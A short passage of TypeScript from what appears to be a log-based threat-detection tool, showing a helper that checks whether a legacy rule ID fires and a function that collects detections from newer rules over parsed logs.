  const ids = huntThreats(legacy, "test").findings.map((f) => f.ruleId);
  return id === "web.payload" ? ids.some((x) => x.startsWith("web.payload-")) : ids.includes(id);
}

/** Every rule's non-legacy detections over parsed logs. */
export function runRules(p: ParsedLogs): Detection[] {
  return RULES_NEW.flatMap((r) => r.detect?.(p) ?? []);
}
